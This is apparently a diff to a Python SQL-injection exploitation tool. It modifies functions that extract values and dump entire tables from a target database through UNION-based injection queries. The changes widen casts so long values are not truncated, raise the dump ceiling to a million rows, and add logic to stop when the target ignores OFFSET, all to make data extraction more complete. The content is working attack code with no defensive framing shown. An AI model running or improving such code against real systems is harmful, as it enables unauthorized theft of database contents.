@@ -727,8 +727,10 @@ def union_setup(http, oracle, dbms, maxcols=15):
 def union_value(http, oracle, dbms, ncols, refcol, expr):
     """Extract one SQL expression's value in a single request."""
     inner = f"({expr})"
-    if dbms in ("mssql", "postgres"):
-        inner = f"cast({inner} as varchar(4000))"
+    if dbms == "mssql":
+        inner = f"cast({inner} as varchar(max))"      # not varchar(4000): don't clip a long value
+    elif dbms == "postgres":
+        inner = f"cast({inner} as varchar)"           # unbounded
     umark = _marks_of(oracle).umark
     mark = _strlit(dbms, umark)
     cols = ["NULL"] * ncols
@@ -754,7 +756,8 @@ def _agg_catalog(value_fn, dbms, marks, which, db=None, **fmt):
 
 _DUMP_BLOCK = 50           # rows per dump request — keeps each group_concat well under
                            # MySQL's group_concat_max_len (1024 B default) vs truncating
-_DUMP_CAP = 10000          # safety bound so a huge/echoing table can't loop forever
+_DUMP_CAP = 1_000_000      # hard ceiling vs a pathological non-terminating target — high
+                           # enough never to clip a real table (echo/short-block end first)
 
 
 def _cell(dbms, c):
@@ -791,14 +794,16 @@ def _agg_dump(value_fn, dbms, marks, table, cols, db=None):
         parts.append(_cell(dbms, c))
     row = _ucat(dbms, parts)
     src = _qualify(dbms, db, table)
-    rows, off = [], 0
-    while off < _DUMP_CAP:
+    rows, off, prev = [], 0, None
+    while len(rows) < _DUMP_CAP:
         data = value_fn(f"SELECT {_uagg(dbms, row, marks.rowsep)} FROM {_window(dbms, src, _DUMP_BLOCK, off)}")
         got = [r.split(marks.colsep) for r in data.split(marks.rowsep) if r]
-        rows.extend(got)
-        if len(got) < _DUMP_BLOCK:
+        if not got or got == prev:        # exhausted, or the target ignores OFFSET (echo) — stop
             break
-        off += _DUMP_BLOCK
+        rows.extend(got)
+        if len(got) < _DUMP_BLOCK:         # a short final block — the table ended
+            break
+        prev, off = got, off + _DUMP_BLOCK
     return rows
 
 
